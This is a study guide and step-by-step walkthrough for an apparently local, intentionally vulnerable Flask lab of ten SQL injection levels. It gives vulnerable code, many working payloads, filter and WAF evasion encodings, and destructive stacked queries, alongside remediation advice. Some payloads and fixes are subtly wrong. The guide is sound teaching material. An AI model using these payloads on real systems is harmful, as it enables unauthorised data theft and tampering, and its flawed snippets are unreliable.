# SQL Injection Dojo - Complete SQLi Vulnerability Study Guide

## Overview

This educational web application contains **10 progressive SQL injection vulnerability challenges** designed to help students understand SQL injection attacks, from basic login bypasses to advanced stacked queries and second-order injection. Each level demonstrates a different type of SQL injection vulnerability with various security controls that can be bypassed.

**Application Details:**
- **Framework**: Flask (Python)
- **Theme**: Blue holographic cyber range interface
- **Database**: In-memory SQLite for injection challenges
- **Port**: 1111
- **Access**: `http://localhost:1111`

---

## How to Use This Guide

1. **Start the Application**: `python vuln_sqli.py`
2. **Navigate** through levels 1-10 in order
3. **Read** each vulnerability description
4. **Try the suggested payloads** to understand the attack
5. **Study the source code** to see how the vulnerability works
6. **Learn the remediation** strategies to prevent similar attacks

---

## Level-by-Level Vulnerability Analysis

### Level 1: Login Bypass (String) - Easy

**URL**: `http://localhost/level1`

**Vulnerability Type**: Authentication Bypass

**Code Location**: `vuln_sqli.py:186-204`

**How it Works**:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
# Direct string concatenation without sanitization
```

**Attack Flow**:
1. Attacker submits malicious credentials
2. SQL query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = '...'`
3. Everything after `--` is treated as a comment
4. Authentication succeeds as admin

**Successful Payloads**:
```
admin' --
admin' #
admin' OR '1'='1
```

**Impact**: Complete authentication bypass, administrative access.

**Remediation**:
```python
# Use parameterized queries
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

---

### Level 2: Login Bypass (Integer) - Easy

**URL**: `http://localhost/level2`

**Vulnerability Type**: Integer Injection

**Code Location**: `vuln_sqli.py:207-224`

**How it Works**:
```python
# VULN: Direct integer concatenation without validation
query = f"SELECT * FROM products WHERE id = {product_id}"
```

**Attack Flow**:
1. Attacker injects into integer parameter
2. Query becomes: `SELECT * FROM products WHERE id = 1 OR 1=1`
3. `OR 1=1` makes condition always true
4. All products are returned

**Successful Payloads**:
```
1 OR 1=1
1 UNION SELECT 1,2,3--
1 AND SLEEP(3)--
```

**Impact**: Data disclosure, information enumeration, potential DoS.

**Remediation**:
```python
# Validate integer input
try:
    product_id = int(product_id)
    query = "SELECT * FROM products WHERE id = ?"
except ValueError:
    return "Invalid ID"
```

---

### Level 3: UNION Attack (Visible) - Medium

**URL**: `http://localhost/level3`

**Vulnerability Type**: UNION-based SQL Injection

**Code Location**: `vuln_sqli.py:227-245`

**How it Works**:
```python
# VULN: User input reflected in SELECT statement
query = f"SELECT id, name FROM products WHERE name LIKE '%{search_term}%'"
```

**Attack Flow**:
1. Attacker discovers column count via ORDER BY
2. Uses UNION SELECT to combine with secrets table
3. Extracts sensitive data from hidden table

**Successful Payloads**:
```sql
' UNION SELECT id, flag FROM secrets--
' UNION SELECT 1,sqlite_version()--
' UNION SELECT sql,1 FROM sqlite_master--
```

**Column Enumeration**:
```sql
' ORDER BY 1--   # Check if 1 column exists
' ORDER BY 2--   # Check if 2 columns exist
' ORDER BY 3--   # Error if more columns than available
```

**Impact**: Data extraction from arbitrary tables, database schema discovery.

**Remediation**:
```python
# Use parameterized queries with LIKE
query = "SELECT id, name FROM products WHERE name LIKE ?"
cursor.execute(query, (f"%{search_term}%",))
```

---

### Level 4: Error Based - Medium

**URL**: `http://localhost/level4`

**Vulnerability Type**: Error-based SQL Injection

**Code Location**: `vuln_sqli.py:248-265`

**How it Works**:
```python
# VULN: Raw error messages exposed to user
try:
    query = f"SELECT * FROM users WHERE id = {user_id}"
    result = cursor.execute(query)
except sqlite3.Error as e:
    return f"Database Error: {e}"  # Exposes SQL details
```

**Attack Flow**:
1. Attacker injects malicious SQL syntax
2. Database throws detailed error message
3. Error reveals database structure, table names, column types

**Successful Payloads**:
```sql
1'                      # Basic syntax error
1"                      # Different quote test
(SELECT * FROM secrets) # Subquery error
CAST(1 AS INT)          # Type conversion error
```

**Information Gained**:
- Database type and version
- Table and column names
- Data types
- Query structure

**Impact**: Database schema enumeration, information disclosure.

**Remediation**:
```python
# Generic error messages
try:
    query = "SELECT * FROM users WHERE id = ?"
    result = cursor.execute(query, (user_id,))
except sqlite3.Error:
    return "An error occurred. Please try again."
```

---

### Level 5: Boolean Blind - Hard

**URL**: `http://localhost/level5`

**Vulnerability Type**: Boolean-based Blind SQL Injection

**Code Location**: `vuln_sqli.py:268-285`

**How it Works**:
```python
# VULN: No error messages, only success/failure indication
query = f"SELECT * FROM users WHERE username = '{username}'"
result = cursor.execute(query)
if result.fetchone():
    return "User found"
else:
    return "User not found"
```

**Attack Flow**:
1. Attacker crafts TRUE/FALSE conditions
2. Observes response differences
3. Extracts data character by character

**Payload Structure**:
```sql
admin' AND SUBSTR(password,1,1) = 'a'--    # Test first character
admin' AND LENGTH(password) = 10--         # Test password length
admin' AND ASCII(SUBSTR(password,1,1)) > 64-- # Test ASCII range
```

**Automated Extraction**:
```sql
' AND (SELECT SUBSTR(flag,1,1) FROM secrets LIMIT 1) = 'F'--
' AND (SELECT ASCII(SUBSTR(flag,1,1)) FROM secrets LIMIT 1) = 70--
```

**Impact**: Data extraction without error messages, stealthy data harvesting.

**Remediation**:
```python
# Use parameterized queries
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
# Add response time randomization to prevent timing attacks
```

---

### Level 6: Time Based Blind - Hard

**URL**: `http://localhost/level6`

**Vulnerability Type**: Time-based Blind SQL Injection

**Code Location**: `vuln_sqli.py:288-305`

**How it Works**:
```python
# VULN: Consistent response regardless of query result
query = f"SELECT * FROM products WHERE id = {product_id}"
cursor.execute(query)
return "Product search complete"  # Always same response
```

**Attack Flow**:
1. Attacker injects time-delay functions
2. Measures response time differences
3. Extracts data based on timing variations

**SQLite Time Functions**:
```sql
' AND (SELECT CASE WHEN (condition) THEN randomblob(100000000) ELSE 0 END)--
' AND (SELECT LOAD_EXTENSION('sqlite3.dll','sqlite3_sleep'))--
' AND (SELECT COUNT(*) FROM (SELECT * FROM secrets UNION SELECT * FROM secrets UNION SELECT * FROM secrets))--
```

**Oracle/MySQL Time Functions**:
```sql
' AND SLEEP(5)--                    # MySQL
' AND pg_sleep(5)--                 # PostgreSQL
' AND WAITFOR DELAY '00:00:05'--    # SQL Server
' AND DBMS_LOCK.SLEEP(5)--          # Oracle
```

**Payload Examples**:
```sql
1' AND (SELECT CASE WHEN (SELECT SUBSTR(flag,1,1) FROM secrets LIMIT 1) = 'F' THEN SLEEP(3) ELSE 0 END)--
```

**Impact**: Data extraction without any visual feedback, bypasses all display filters.

**Remediation**:
```python
# Parameterized queries + response time limits
import time
start_time = time.time()
query = "SELECT * FROM products WHERE id = ?"
cursor.execute(query, (product_id,))
# Enforce maximum response time
if time.time() - start_time > 10:
    return "Request timeout"
```

---

### Level 7: Filter Bypass (Space) - Hard

**URL**: `http://localhost/level7`

**Vulnerability Type**: Filter Evasion

**Code Location**: `vuln_sqli.py:308-325`

**Filter Implementation**:
```python
# FILTER: Remove spaces from input
filtered_input = input_text.replace(' ', '')
```

**Bypass Techniques**:

1. **SQL Comments**:
```sql
1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets
```

2. **Tab Characters**:
```sql
1	TAB	UNION	TAB	SELECT	flag,1,1	TAB	FROM	TAB	secrets
```

3. **Multiple Spaces**:
```sql
1   UNION   SELECT   flag,1,1   FROM   secrets
```

4. **Parentheses**:
```sql
(1)UNION(SELECT(flag),(1),(1))FROM(secrets)
```

5. **Concatenation**:
```sql
1'/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets--
```

**Advanced Evasion**:
```sql
1%a0UNION%a0SELECT%a0flag,1,1%a0FROM%a0secrets--  # Non-breaking spaces
1+UNION+SELECT+flag,1,1+FROM+secrets--             # URL-encoded spaces
1/*comment*/UNION/*comment*/SELECT/*comment*/flag,1,1/*comment*/FROM/*comment*/secrets--
```

**Impact**: Bypasses input filters, enables standard SQL injection techniques.

**Remediation**:
```python
# Comprehensive input sanitization
import re
def sanitize_input(input_text):
    # Remove all whitespace variations
    sanitized = re.sub(r'\s+', '', input_text)
    # Block SQL keywords entirely
    if re.search(r'(union|select|from|where|and|or)', sanitized, re.IGNORECASE):
        raise ValueError("SQL keywords not allowed")
    return sanitized
```

---

### Level 8: Second Order SQLi - Expert

**URL**: `http://localhost/level8`

**Vulnerability Type**: Second-order SQL Injection

**Code Location**: `vuln_sqli.py:328-350`

**How it Works**:
```python
# VULN 1: Malicious data stored without sanitization
c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))

# VULN 2: Stored data used unsafely in another query
query = f"SELECT role FROM users WHERE username = '{stored_username}'"  # stored_username contains payload
```

**Attack Flow**:
1. **Stage 1**: Register user with malicious username
2. **Stage 2**: Admin views user profile later
3. **Stage 3**: Stored payload executes in new query context

**Stage 1 Payload** (Registration):
```sql
admin' --
admin' OR '1'='1
'; UPDATE users SET role='admin' WHERE username='attacker'--
```

**Stage 2 Execution** (When admin views profile):
```sql
-- Original query: SELECT role FROM users WHERE username = 'admin' --'
-- Becomes: SELECT role FROM users WHERE username = 'admin' --'
-- Returns admin role for attacker account
```

**Real-World Examples**:
- User profiles with embedded SQL
- Order comments affecting inventory queries
- Medical records affecting billing systems

**Impact**: Privilege escalation, data modification, persistent attacks across user sessions.

**Remediation**:
```python
# Always escape data when constructing queries from stored data
def get_user_role(username):
    # Use parameterized queries even with stored data
    query = "SELECT role FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()

# OR validate stored data before use
import re
def is_safe_username(username):
    return re.match(r'^[a-zA-Z0-9_]+$', username) is not None
```

---

### Level 9: WAF Bypass (Keywords) - Expert

**URL**: `http://localhost/level9`

**Vulnerability Type**: Web Application Firewall Bypass

**Code Location**: `vuln_sqli.py:353-375`

**WAF Implementation**:
```python
# WAF: Block common SQL injection patterns
blocked_patterns = ['UNION SELECT', 'DROP TABLE', 'INSERT INTO', 'UPDATE SET']
for pattern in blocked_patterns:
    if pattern.lower() in query.lower():
        return "WAF: SQL injection detected"
```

**Bypass Techniques**:

1. **Case Obfuscation**:
```sql
' UniOn SelEcT flag FROM secrets--
```

2. **Comment Insertion**:
```sql
' UNION/**/SELECT flag,1,1 FROM secrets--
' UNION/*comment*/SELECT flag,1,1 FROM secrets--
```

3. **URL Encoding**:
```sql
' %55%4E%49%4F%4E %53%45%4C%45%43%54 flag,1,1 FROM secrets--
```

4. **Double Encoding**:
```sql
' %2555%254E%2549%254F%254E %2553%2545%254C%2545%2543%2554 flag,1,1 FROM secrets--
```

5. **Whitespace Variations**:
```sql
' UNION%0ASELECT%0Aflag,1,1%0AFROM%0Asecrets--  # Newline
' UNION%09SELECT%09flag,1,1%09FROM%09secrets--  # Tab
' UNION%A0SELECT%A0flag,1,1%AFROM%A0secrets--    # Non-breaking space
```

6. **Logical Operator Obfuscation**:
```sql
' || (SELECT flag FROM secrets)--
' && (SELECT flag FROM secrets)--
' XOR (SELECT flag FROM secrets)--
```

**Advanced WAF Bypass**:
```sql
' /*!UNION*/ /*!SELECT*/ flag,1,1 FROM secrets--           # MySQL comments
' UNION ALL SELECT flag,1,1 FROM secrets--                # Variation
' UNION DISTINCT SELECT flag,1,1 FROM secrets--           # Variation
' SELECT flag FROM secrets UNION SELECT 1,2,3--           # Reversed order
```

**Impact**: Complete bypass of security controls, enables advanced SQL injection attacks.

**Remediation**:
```python
# Multi-layered approach with context-aware validation
import re

def advanced_waf_bypass(input_text):
    # Normalize encoding
    import urllib.parse
    normalized = urllib.parse.unquote(urllib.parse.unquote(input_text))

    # Remove all comments and extra whitespace
    normalized = re.sub(r'/\*.*?\*/', '', normalized)
    normalized = re.sub(r'\s+', '', normalized)

    # Check for SQL patterns regardless of case or obfuscation
    sql_keywords = ['UNION', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'EXEC']
    for keyword in sql_keywords:
        if keyword in normalized.upper():
            return False

    return True
```

---

### Level 10: Stacked Queries - Expert

**URL**: `http://localhost/level10`

**Vulnerability Type**: Stacked Query Injection

**Code Location**: `vuln_sqli.py:378-400`

**How it Works**:
```python
# VULN: Multiple statements supported via executescript()
query = f"SELECT * FROM products WHERE id = {product_id}"
cursor.executescript(query)  # Allows multiple SQL statements
```

**Attack Flow**:
1. Attacker injects semicolon-separated queries
2. Database executes multiple statements sequentially
3. Second statement performs malicious action

**Successful Payloads**:

1. **Password Reset**:
```sql
1; UPDATE users SET password='pwned' WHERE username='admin';--
```

2. **Data Extraction**:
```sql
1; SELECT flag FROM secrets; SELECT sqlite_version();--
```

3. **Database Modification**:
```sql
1; INSERT INTO users (username,password,role) VALUES 'hacker','pass','admin');--
```

4. **Information Gathering**:
```sql
1; SELECT name FROM sqlite_master WHERE type='table';--
1; PRAGMA table_info(secrets);--
```

5. **Shell Command (SQLite)**:
```sql
1; ATTACH DATABASE '/tmp/shell.db' AS shell; CREATE TABLE shell.cmd(cmd TEXT);--
```

**Database-Specific Stacked Query Support**:
- **PostgreSQL**: Fully supported
- **MySQL**: Limited support with mysqli_multi_query()
- **SQLite**: Supported via executescript()
- **SQL Server**: Supported with proper connection settings
- **Oracle**: Limited, requires PL/SQL blocks

**Advanced Stacked Queries**:
```sql
1; DROP TABLE IF EXISTS temp_flag; CREATE TABLE temp_flag(data TEXT); INSERT INTO temp_flag SELECT flag FROM secrets; SELECT * FROM temp_flag;--
```

**Impact**: Complete database control, data modification, command execution potential.

**Remediation**:
```python
# Use single statement execution methods
query = "SELECT * FROM products WHERE id = ?"
cursor.execute(query, (product_id,))  # execute() only, not executescript()

# Or explicitly disable multiple statements
cursor.execute("PRAGMA busy_timeout = 1000")  # Limit execution time
```

---

## General SQL Injection Prevention Strategies

### 1. Parameterized Queries (Prepared Statements)

```python
# Correct: Parameterized queries
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

# Wrong: String concatenation
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

### 2. Input Validation

```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username format")
    return username.lower()

def validate_id(user_id):
    try:
        return int(user_id)  # Ensure integer
    except ValueError:
        raise ValueError("ID must be a number")
```

### 3. Least Privilege Database Access

```sql
-- Create limited application user
CREATE USER app_user WITH PASSWORD 'secure_pass';
GRANT SELECT ON products TO app_user;
GRANT SELECT, INSERT ON orders TO app_user;
-- NEVER GRANT DROP, ALTER, or system privileges
```

### 4. Stored Procedures

```python
# Use stored procedures with parameter validation
def get_user_by_id(user_id):
    try:
        user_id = int(user_id)
        cursor.callproc('get_user_info', [user_id])
        return cursor.fetchall()
    except (ValueError, sqlite3.Error):
        return None
```

### 5. ORM Frameworks

```python
# SQLAlchemy examples
from sqlalchemy.orm import Session

# Safe ORM query
user = session.query(User).filter(User.id == user_id).first()

# Avoid raw SQL
# unsafe = session.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 6. Web Application Firewall (WAF)

```python
# Multi-layer WAF implementation
def waf_protection(input_data):
    # Encoding normalization
    import urllib.parse
    normalized = urllib.parse.unquote(input_data)

    # SQL pattern detection
    sql_patterns = [
        r'(?i)(union\s+select)',
        r'(?i)(drop\s+table)',
        r'(?i)(insert\s+into)',
        r'(?i)(update\s+set)',
        r'(?i)(delete\s+from)',
        r'(?i)(exec\s*\()',
        r'(?i)(sleep\s*\()',
    ]

    for pattern in sql_patterns:
        if re.search(pattern, normalized):
            return False

    return True
```

### 7. Error Handling

```python
import logging

def safe_database_operation(query, params=()):
    try:
        cursor.execute(query, params)
        return cursor.fetchall()
    except sqlite3.Error as e:
        logging.error(f"Database error: {e}")
        # Return generic error to user
        return None
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return None
```

---

## Complete Exploitation Guide - Step-by-Step Instructions

### Before Starting

1. **Start the Application**: `python vuln_sqli.py`
2. **Access URL**: `http://localhost:1111`
3. **Database Structure**:
   - **users**: (id, username, password, role)
   - **products**: (id, name, price, description)
   - **secrets**: (id, flag) - Contains the target flag

---

### Level 1: Login Bypass (String) - Step-by-Step Exploitation

**Goal**: Login as admin without knowing the password

**Location**: `http://localhost:1111/level1`

**Step-by-Step**:

1. **Navigate** to Level 1
2. **Enter** the following payload in the **Username** field:
   ```
   admin' --
   ```
3. **Enter** any password (doesn't matter what you enter)
4. **Click** LOGIN

**What Happens**:
- Original query: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'entered_password'`
- The `--` comments out the rest of the query
- Database only executes: `SELECT * FROM users WHERE username = 'admin'`
- Authentication succeeds!

**Success Message**: `[ACCESS GRANTED]`

**Alternative Payloads**:
```
admin' #
admin' OR '1'='1
' OR 1=1 --
```

---

### Level 2: Integer Injection - Step-by-Step Exploitation

**Goal**: Display all products from the database

**Location**: `http://localhost:1111/level2`

**Step-by-Step**:

1. **Navigate** to Level 2
2. **Modify** the URL parameter or enter in the ID field:
   ```
   1 OR 1=1
   ```
3. **Click** GO

**What Happens**:
- Original query: `SELECT name, price FROM products WHERE id = 1 OR 1=1`
- `OR 1=1` makes the condition always true
- Returns ALL products from the table

**Success**: All products displayed (Quantum Core, Plasma Ray, Stealth Chip)

** Advanced Payloads**:
```
1 UNION SELECT 1,2,3--      # Test for UNION injection
1 AND SLEEP(3)--            # Test for time-based blind injection
```

---

### Level 3: UNION Attack - Step-by-Step Exploitation

**Goal**: Extract the flag from the secrets table

**Location**: `http://localhost:1111/level3`

**Step-by-Step**:

1. **Navigate** to Level 3
2. **Enter** the following payload in the search box:
   ```
   ' UNION SELECT id, flag, 1 FROM secrets--
   ```
3. **Click** SCAN

**What Happens**:
- Original query: `SELECT name, description, price FROM products WHERE name LIKE '%' UNION SELECT id, flag, 1 FROM secrets--'`
- The UNION combines results from products and secrets tables
- The `1` is a dummy value to match the 3-column structure
- Flag is extracted!

**Success Result**: `FLAG{SQLI_MASTER_CLASS}` appears in the results

**Column Enumeration Steps**:
```
' ORDER BY 1--   # Works (at least 1 column)
' ORDER BY 2--   # Works (at least 2 columns)
' ORDER BY 3--   # Works (at least 3 columns)
' ORDER BY 4--   # Error (only 3 columns)
```

**Alternative Payloads**:
```
' UNION SELECT 1,sqlite_version(),3--  # Get SQLite version
' UNION SELECT sql,1,1 FROM sqlite_master--  # Get table schemas
```

---

### Level 4: Error-Based Injection - Step-by-Step Exploitation

**Goal**: Trigger a database syntax error to confirm vulnerability

**Location**: `http://localhost:1111/level4`

**Step-by-Step**:

1. **Navigate** to Level 4
2. **Enter** the following payload in the UUID field:
   ```
   1'
   ```
3. **Click** CHECK SYSTEM

**What Happens**:
- Original query: `SELECT * FROM users WHERE username = '1''`
- The extra single quote creates unmatched quotes
- SQLite throws a syntax error
- Error confirms SQL injection vulnerability

**Success Message**: `[+] VULNERABILITY CONFIRMED! Database returned a syntax error`

** Alternative Error-Inducing Payloads**:
```
1"                      # Test double quotes
(SELECT * FROM secrets) # Subquery error
CAST('abc' AS INT)      # Type conversion error
1 AND (SELECT * FROM non_existent_table)--
```

---

### Level 5: Boolean Blind Injection - Step-by-Step Exploitation

**Goal**: Confirm admin user exists using TRUE/FALSE responses

**Location**: `http://localhost:1111/level5`

**Step-by-Step**:

1. **Navigate** to Level 5
2. **Test TRUE condition** - enter:
   ```
   admin' AND 1=1--
   ```
3. **Observe**: `[ USER FOUND ]`
4. **Test FALSE condition** - enter:
   ```
   admin' AND 1=0--
   ```
5. **Observe**: `[ NOT FOUND ]`

**What Happens**:
- True condition: `SELECT * FROM users WHERE username = 'admin' AND 1=1--'` → finds admin
- False condition: `SELECT * FROM users WHERE username = 'admin' AND 1=0--' → no results
- Different responses allow data extraction

**Advanced Character-by-Character Extraction**:
```
admin' AND SUBSTR(password,1,1) = 's'--    # Test first character of password
admin' AND LENGTH(password) = 17--         # Test password length
admin' AND ASCII(SUBSTR(password,1,1)) = 115-- # Test ASCII value
```

---

### Level 6: Time-Based Blind Injection - Step-by-Step Exploitation

**Goal**: Make database sleep for 3 seconds using time delay

**Location**: `http://localhost:1111/level6`

**Step-by-Step**:

1. **Navigate** to Level 6
2. **Enter** the following payload:
   ```
   ' OR (SELECT CASE WHEN (1=1) THEN sleep(3) ELSE 0 END)--
   ```
3. **Click** EXECUTE
4. **Wait** and observe response time

**What Happens**:
- Database sleeps for 3 seconds before responding
- Response time indicator shows abnormal delay (>2.00s)
- `[!] TIMING ATTACK DETECTED [!]` message appears
- Confirms blind SQL injection without visual feedback

**Success**: Response time shows `3.00s` (or similar delay)

**Alternative Time-Based Payloads**:
```
' AND (SELECT COUNT(*) FROM (SELECT * FROM secrets UNION SELECT * FROM secrets UNION SELECT * FROM secrets))--
' AND (SELECT CASE WHEN (SELECT SUBSTR(flag,1,1) FROM secrets) = 'F' THEN sleep(3) ELSE 0 END)--
```

---

### Level 7: Filter Bypass (Space) - Step-by-Step Exploitation

**Goal**: Bypass WAF that blocks spaces and extract the flag

**Location**: `http://localhost:1111/level7`

**Step-by-Step**:

1. **Navigate** to Level 7
2. **Enter** the following payload in the ID field:
   ```
   1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets
   ```
3. **Click** LOAD

**What Happens**:
- WAF blocks normal spaces: `WAF ERROR: Malicious input detected (Space character)`
- SQL comments `/**/` replace spaces and bypass the filter
- Query executes successfully and extracts the flag
- `[SUCCESS] FLAG CAPTURED!` message appears

**Success**: Flag displayed in product view

**Alternative Space-Bypassing Techniques**:
```
1/**/UNION/**/SELECT/**/flag,price,description/**/FROM/**/secrets
(1)UNION(SELECT(flag),1,1)FROM(secrets)           # Parentheses
1%09UNION%09SELECT%09flag,1,1%09FROM%09secrets     # Tab characters
1+UNION+SELECT+flag,1,1+FROM+secrets                 # Plus signs
```

---

### Level 8: Second-Order Injection - Step-by-Step Exploitation

**Goal**: Gain admin privileges using stored malicious data

**Location**: `http://localhost:1111/level8`

**Step-by-Step**:

**Step 1: Registration Phase**
1. **Navigate** to Level 8
2. **Enter** the following payload as username:
   ```
   admin' --
   ```
3. **Click** REGISTER
4. **Result**: Proceeds to view step

**Step 2: Exploitation Phase**
5. **Observe** the role display page
6. **The stored username** `admin' --` gets used in a new query:
   ```sql
   SELECT role FROM users WHERE username = 'admin' --'
   ```
7. **Query returns** admin role instead of guest role

**What Happens**:
- Malicious payload stored in database during registration
- Later retrieval in another query context causes SQL injection
- The `--` comments out the actual username condition
- Returns admin role for the malicious user

**Success**: ROLE shows as `admin` instead of `guest`

**Alternative Second-Order Payloads**:
```
admin' OR '1'='1    # Always returns admin
'; UPDATE users SET role='admin' WHERE username='attacker'--    # Modify data
```

---

### Level 9: WAF Bypass (Keywords) - Step-by-Step Exploitation

**Goal**: Bypass WAF that blocks "UNION SELECT" keyword

**Location**: `http://localhost:1111/level9`

**Step-by-Step**:

1. **Navigate** to Level 9
2. **Test WAF** - enter: `UNION SELECT flag FROM secrets`
3. **Observe**: `WAF BLOCKED: 'UNION SELECT'`
4. **Bypass WAF** - enter:
   ```
   ' UNION/**/SELECT/**/id,flag,1/**/FROM/**/secrets--
   ```
5. **Click** SEARCH

**What Happens**:
- WAF uses regex `/union\s+select/` to detect UNION + whitespace + SELECT
- SQL comments `/**/` break the whitespace pattern
- WAF doesn't recognize the pattern as a threat
- Query executes and extracts the flag

**Success**: Flag appears in search results

**Advanced WAF Bypass Techniques**:
```
' UniOn SeLeCt flag,1,1 FROM secrets--           # Case variation
' UNION%0ASELECT%0Aflag,1,1 FROM secrets--        # Newline characters
' UNION%09SELECT%09flag,1,1 FROM secrets--        # Tab characters
' UNION/*!SELECT*/flag,1,1 FROM secrets--         # MySQL-style comments
' UNION ALL SELECT flag,1,1 FROM secrets--        # Keyword variation
```

---

### Level 10: Stacked Queries - Step-by-Step Exploitation

**Goal**: Change admin password using semicolon-separated queries

**Location**: `http://localhost:1111/level10`

**Step-by-Step**:

1. **Navigate** to Level 10
2. **Enter** the following payload in User ID field:
   ```
   1; UPDATE users SET password='pwned' WHERE username='admin';--
   ```
3. **Click** EXECUTE

**What Happens**:
- `executescript()` allows multiple SQL statements
- First statement: `SELECT * FROM users WHERE id = 1`
- Second statement: `UPDATE users SET password='pwned' WHERE username='admin'`
- Admin password gets changed to 'pwned'
- System detects password change and confirms success

**Success Message**: `[SYSTEM PWNED! Password changed.]`

**Advanced Stacked Query Payloads**:
```
1; SELECT flag FROM secrets; SELECT sqlite_version();--
1; DROP TABLE IF EXISTS temp; CREATE TABLE temp(data TEXT); INSERT INTO temp SELECT flag FROM secrets;--
1; ATTACH DATABASE '/tmp/backup.db' AS backup; CREATE TABLE backup.secrets AS SELECT * FROM secrets;--
```

---

## Complete Success Validation

After completing all 10 levels, you should have:

 **Level 1**: Authentication bypass as admin
 **Level 2**: Display all products via integer injection
 **Level 3**: Extract flag using UNION attack
 **Level 4**: Trigger syntax errors for vulnerability confirmation
 **Level 5**: Boolean blind injection to verify admin existence
 **Level 6**: Time-based injection with 3-second delay
 **Level 7**: Bypass space filter using SQL comments
 **Level 8**: Second-order injection for privilege escalation
 **Level 9**: WAF keyword filtering bypass
 **Level 10**: Stacked queries for data modification

**Final Flag**: `FLAG{SQLI_MASTER_CLASS}`

---

**Note**: This application is designed for educational purposes to demonstrate SQL injection vulnerabilities. Always follow secure coding practices in production applications.